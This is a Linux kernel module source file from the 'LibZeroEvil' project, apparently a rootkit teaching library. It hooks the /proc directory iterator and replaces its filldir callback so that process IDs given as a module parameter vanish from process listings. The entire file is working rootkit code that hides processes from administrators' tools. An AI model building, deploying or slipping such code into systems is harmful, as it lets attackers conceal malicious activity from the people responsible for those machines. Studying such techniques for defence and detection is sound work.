// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
// filp_open, filp_close, struct file, struct dir_context.
# include <linux/fs.h>
# endif // CPP

//#define DEBUG
# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define ROOT_PATH "/proc"
static unsigned int secret_pids[10];
static unsigned int secret_pids_c;
module_param_array_named(pids, secret_pids, uint, &secret_pids_c,S_IRUGO);
MODULE_PARM_DESC(pids, "some process ids");

int
(*real_iterate)(struct file *filp, struct dir_context *ctx);
int
(*real_filldir)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);

int
fake_iterate(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);


int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);

    if (!real_iterate) {
        return -ENOENT;
    }

    return 0;
}


void
cleanup_module(void)
{
    if (real_iterate) {
        void *dummy;
        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
    }

    fm_alert("%s\n", "Farewell the World!");
    return;
}


int
fake_iterate(struct file *filp, struct dir_context *ctx)
{
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    char *endp;
    long pid;
    int i;

    pid = simple_strtol(name, &endp, 10);

    for (i=0; i<secret_pids_c; i++) {
        if (pid == secret_pids[i]) {
            fm_alert("Hiding pid: %ld", pid);
            return 0;
        }
    }

    /* pr_cont("%s ", name); */

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
